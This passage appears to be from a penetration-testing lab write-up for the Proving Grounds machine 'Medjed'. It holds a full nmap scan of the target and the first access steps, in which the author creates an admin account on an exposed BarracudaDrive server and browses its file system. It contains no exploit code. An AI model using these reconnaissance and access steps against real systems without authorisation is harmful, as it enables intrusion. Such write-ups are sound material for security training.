### Enumeration

```
# Nmap 7.92 scan initiated Tue Mar 22 11:26:10 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.194.127/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.194.127/scans/xml/_full_tcp_nmap.xml 192.168.194.127
Increasing send delay for 192.168.194.127 from 0 to 5 due to 55 out of 137 dropped probes since last increase.
Warning: 192.168.194.127 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.194.127
Host is up, received user-set (0.28s latency).
Scanned at 2022-03-22 11:26:10 EDT for 2063s
Not shown: 65439 closed tcp ports (reset), 78 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql?        syn-ack ttl 127
| mysql-info: 
|_  MySQL Error: Host '192.168.49.194' is not allowed to connect to this MariaDB server
| fingerprint-strings: 
|   NULL, NotesRPC, kumo-server: 
|_    Host '192.168.49.194' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown       syn-ack ttl 127
8000/tcp  open  http-alt      syn-ack ttl 127 BarracudaServer.com (Windows)
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK POST
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Type: BarracudaServer.com (Windows)
|_  Server Date: Tue, 22 Mar 2022 16:00:02 GMT
|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
|_http-server-header: BarracudaServer.com (Windows)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| fingerprint-strings: 
|   FourOhFourRequest, Socks5: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:43 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:36 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:37 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HELP4STOMP: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:53:47 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:49 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   OfficeScan: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:53:41 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:50 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 22 Mar 2022 15:52:10 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|     <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|   apple-iphoto: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 22 Mar 2022 15:55:13 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>HTTP/1.1 clients must supply "host" header<p>BarracudaServer.com (Windows)</p></body></html>
30021/tcp open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
33033/tcp open  unknown       syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown   syn-ack ttl 127
|_ssl-date: 2022-03-22T16:00:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US/organizationalUnitName=SharkSSL/emailAddress=ginfo@realtimelogic.com/localityName=Laguna Niguel
| Issuer: commonName=demo CA/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US/organizationalUnitName=SharkSSL/emailAddress=ginfo@realtimelogic.com/localityName=Laguna Niguel
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-08-27T14:40:47
| Not valid after:  2019-08-25T14:40:47
| MD5:   3dd3 7bf7 464d a77b 6d04 f44c 154b 7563
| SHA-1: 3dc2 5fc6 a16f 1c51 8eee 45ce 80cf b35e 7f92 ebbe
| -----BEGIN CERTIFICATE-----
| MIICsTCCAhoCAQUwDQYJKoZIhvcNAQEEBQAwgZkxCzAJBgNVBAYTAlVTMQswCQYD
| VQQIEwJDQTEWMBQGA1UEBxMNTGFndW5hIE5pZ3VlbDEYMBYGA1UEChMPUmVhbCBU
| aW1lIExvZ2ljMREwDwYDVQQLEwhTaGFya1NTTDEQMA4GA1UEAxMHZGVtbyBDQTEm
| MCQGCSqGSIb3DQEJARYXZ2luZm9AcmVhbHRpbWVsb2dpYy5jb20wHhcNMDkwODI3
| MTQ0MDQ3WhcNMTkwODI1MTQ0MDQ3WjCBpzELMAkGA1UEBhMCVVMxCzAJBgNVBAgT
| AkNBMRYwFAYDVQQHEw1MYWd1bmEgTmlndWVsMRgwFgYDVQQKEw9SZWFsIFRpbWUg
| TG9naWMxETAPBgNVBAsTCFNoYXJrU1NMMR4wHAYDVQQDExVzZXJ2ZXIgZGVtbyAx
| MDI0IGJpdHMxJjAkBgkqhkiG9w0BCQEWF2dpbmZvQHJlYWx0aW1lbG9naWMuY29t
| MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDI9kHT2xeC8GaBWFcTTqBLU2iF
| Jt8gu5khgjW1LMkOQ1GgX53+siZP4QxPaua0pIEaGXh/qe1wYmucEjxJvidsyFyN
| vgUjS7yP8AMCRGqdxhkbM4A5mcnmxu/8cRxFf19CIVnsD+netpHrscJfmk5f70cz
| QLQQ2NlT8exLSh+5cQIDAQABMA0GCSqGSIb3DQEBBAUAA4GBAJFWpZDFuw9DUEQW
| Uixb8tg17VjTMEQMd136md/KhwlDrhR2Dqk3cs1XRcuZxEHLN7etTBm/ubkMi6bx
| Jq9rgmn/obL94UNkhuV/0VyHQiNkBrjdf4eY6zNY71PgVBxC0wULL5pcpfo0xUKc
| IDMYIaRX7wyNO/lZcxIj0xmxTrqu
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:52:10 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:54 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:55 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HELP4STOMP: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:54:18 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:56 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   OfficeScan: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:54:11 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:50:57 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 22 Mar 2022 15:52:28 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|     <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|   Socks5: 
|     HTTP/1.1 200 OK
|     Date: Tue, 22 Mar 2022 15:54:04 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   apple-iphoto: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 22 Mar 2022 15:55:49 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>HTTP/1.1 clients must supply "host" header<p>BarracudaServer.com (Windows)</p></body></html>
45332/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-title: Quiz App
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
45443/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.92%I=9%D=3/22%Time=6239F046%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.194'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.194'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(kumo-server,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.194'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.92%I=9%D=3/22%Time=6239F04C%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x20
SF:2022\x2015:50:36\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows
SF:\)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\x20200\
SF:x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:50:37\x20GMT\r\nServe
SF:r:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r
SF:\n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2
SF:022\x20Mar\x202022\x2015:50:43\x20GMT\r\nServer:\x20BarracudaServer\.co
SF:m\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(Socks5,72,"HTTP/1\
SF:.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:50:43\x20GM
SF:T\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20C
SF:lose\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue
SF:,\x2022\x20Mar\x202022\x2015:50:49\x20GMT\r\nServer:\x20BarracudaServer
SF:\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72
SF:,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:50
SF::50\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(SIPOptions,13C,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:52:10\x20GMT\r\nServe
SF:r:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\nCo
SF:ntent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x20no-cache,\x2
SF:0must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400\x20Bad\x20Req
SF:uest</h1>Can't\x20parse\x20request<p>BarracudaServer\.com\x20\(Windows\
SF:)</p></body></html>")%r(OfficeScan,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\
SF:x20Tue,\x2022\x20Mar\x202022\x2015:53:41\x20GMT\r\nServer:\x20Barracuda
SF:Server\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(HELP4STO
SF:MP,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x20
SF:15:53:47\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nCo
SF:nnection:\x20Close\r\n\r\n")%r(apple-iphoto,153,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:55:13\x20GMT\r
SF:\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Clos
SF:e\r\nContent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x20no-ca
SF:che,\x20must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20Request</h1>HTTP/1\.1\x20clients\x20must\x20supply\x20\"host\"\x20h
SF:eader<p>BarracudaServer\.com\x20\(Windows\)</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33033-TCP:V=7.92%I=9%D=3/22%Time=6239F04C%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x2
SF:0charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n
SF:\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20
SF:\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-f
SF:amily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20
SF:\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spa
SF:ce:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\
SF:x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x
SF:20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\
SF:x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x2
SF:0\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddi
SF:ng:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x
SF:20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20chars
SF:et=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x
SF:20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x
SF:20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-
SF:serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x
SF:20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\
SF:x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#
SF:EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\
SF:x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\
SF:x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x2
SF:0font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x
SF:20\x20\x20\x20\x20\x20bord");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44330-TCP:V=7.92%T=SSL%I=9%D=3/22%Time=6239F05E%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20
SF:Mar\x202022\x2015:50:54\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(
SF:Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\
SF:x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:50:55\x20GMT\r
SF:\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Clos
SF:e\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x
SF:2022\x20Mar\x202022\x2015:50:56\x20GMT\r\nServer:\x20BarracudaServer\.c
SF:om\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72,"H
SF:TTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:50:57
SF:\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection
SF::\x20Close\r\n\r\n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\n
SF:Date:\x20Tue,\x2022\x20Mar\x202022\x2015:52:10\x20GMT\r\nServer:\x20Bar
SF:racudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(SI
SF:POptions,13C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2022
SF:\x20Mar\x202022\x2015:52:28\x20GMT\r\nServer:\x20BarracudaServer\.com\x
SF:20\(Windows\)\r\nConnection:\x20Close\r\nContent-Type:\x20text/html\r\n
SF:Cache-Control:\x20no-store,\x20no-cache,\x20must-revalidate,\x20max-age
SF:=0\r\n\r\n<html><body><h1>400\x20Bad\x20Request</h1>Can't\x20parse\x20r
SF:equest<p>BarracudaServer\.com\x20\(Windows\)</p></body></html>")%r(Sock
SF:s5,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x20
SF:15:54:04\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nCo
SF:nnection:\x20Close\r\n\r\n")%r(OfficeScan,72,"HTTP/1\.1\x20200\x20OK\r\
SF:nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:54:11\x20GMT\r\nServer:\x20Ba
SF:rracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(H
SF:ELP4STOMP,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2022\x20Mar\x202
SF:022\x2015:54:18\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\
SF:)\r\nConnection:\x20Close\r\n\r\n")%r(apple-iphoto,153,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nDate:\x20Tue,\x2022\x20Mar\x202022\x2015:55:49\x
SF:20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\
SF:x20Close\r\nContent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x
SF:20no-cache,\x20must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400
SF:\x20Bad\x20Request</h1>HTTP/1\.1\x20clients\x20must\x20supply\x20\"host
SF:\"\x20header<p>BarracudaServer\.com\x20\(Windows\)</p></body></html>");
Aggressive OS guesses: Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 (90%), Microsoft Windows XP SP3 (88%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (88%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (88%), Microsoft Windows Server 2008 SP1 (87%), Microsoft Windows Vista SP2 (87%), Microsoft Windows 10 (87%), Microsoft Windows Server 2008 (87%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/22%OT=135%CT=1%CU=35290%PV=Y%DS=2%DC=T%G=Y%TM=6239F2
OS:A1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=U)OPS
OS:(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M
OS:54ENNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%
OS:T=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25079/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 26711/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 56856/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44947/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-03-22T16:00:03
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   278.54 ms 192.168.49.1
2   285.15 ms 192.168.194.127

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 22 12:00:33 2022 -- 1 IP address (1 host up) scanned in 2063.66 seconds

```

BarracudaDrive runs on port 8000.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h51m17s_001.png)

Browsing to Web-File-Server page.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h52m30s_002.png)

Following the instructions to create an admin account.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h53m25s_003.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h56m12s_004.png)

Browsing to Web-File-Server page again. Clicking on the fs link which takes us to the disk browsing page.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Medjed/Medjed_2022.03.26_15h56m40s_005.png)

